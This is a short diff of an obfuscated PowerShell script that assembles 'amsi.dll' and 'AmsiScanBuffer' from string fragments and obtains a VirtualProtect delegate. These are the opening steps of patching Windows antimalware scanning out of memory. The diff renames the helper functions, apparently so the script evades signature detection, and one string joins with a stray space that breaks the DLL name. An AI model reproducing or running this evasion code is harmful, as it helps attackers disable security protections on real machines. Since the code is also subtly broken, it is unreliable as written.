@@ -23,4 +23,4 @@ $a = "a" + "ms" + "i" + "." + "dll"
 $b =  $a.Substring(0, 1).ToUpper() + $a.Substring(1, 3) + "Sc" + "an" + "Bu" + "ff" + "er"
 $ab = GetAddress $a $b
 
-$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress "ke" + "rnel" + "32.d" +" ll" ("Vir" + "tual" + "Pro" + "tect")), (GetDelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
+$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetAddress "ke" + "rnel" + "32.d" +" ll" ("Vir" + "tual" + "Pro" + "tect")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
